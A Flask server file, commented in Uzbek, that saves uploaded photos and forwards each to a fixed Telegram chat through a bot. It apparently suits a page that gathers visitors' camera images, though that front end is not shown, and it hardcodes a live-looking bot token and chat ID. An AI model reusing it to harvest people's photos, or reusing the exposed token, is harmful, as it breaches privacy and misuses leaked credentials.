from flask import Flask, render_template, request, jsonify
from flask_cors import CORS
import requests
import os
from datetime import datetime
import logging
import asyncio

# ===== TELEGRAM IMPORT =====
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ==================== FLASK ====================
app = Flask(__name__)
CORS(app)

# ==================== TOKENLAR ====================
# ⚠️ Keyinchalik environment ga o‘tkazamiz
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8647111510:AAGSttsSVpDuS0RjxNP0eaWnYdyqOXSYOTQ")
CHAT_ID = os.environ.get("CHAT_ID", "6450239826")

# ==================== TELEGRAM APP ====================
telegram_app = Application.builder().token(BOT_TOKEN).build()

# ==================== PAPKA ====================
PHOTOS_DIR = "photos"
os.makedirs(PHOTOS_DIR, exist_ok=True)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ==================== TELEGRAM HANDLER ====================
async def bot_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🤖 Bot webhook orqali ishlayapti!")

telegram_app.add_handler(CommandHandler("start", bot_start))

# ==================== WEBHOOK ROUTE (MUHIM) ====================
@app.route(f"/webhook/{BOT_TOKEN}", methods=["POST"])
def telegram_webhook():
    try:
        data = request.get_json(force=True)

        async def process():
            await telegram_app.initialize()
            update = Update.de_json(data, telegram_app.bot)
            await telegram_app.process_update(update)

        asyncio.run(process())
        return "ok"

    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return "error", 500

# ==================== WEB ROUTELAR ====================
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/photo', methods=['POST'])
def receive_photo():
    try:
        photo = request.files['photo']

        # Rasmni saqlash
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{PHOTOS_DIR}/photo_{timestamp}.jpg"
        photo.save(filename)

        # Telegramga yuborish
        with open(filename, 'rb') as f:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                files={'photo': f},
                data={'chat_id': CHAT_ID, 'caption': 'Yangi rasm!'}
            )

        return jsonify({'status': 'ok'})

    except Exception as e:
        logger.error(e)
        return jsonify({'error': str(e)}), 500

# ==================== RUN ====================
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
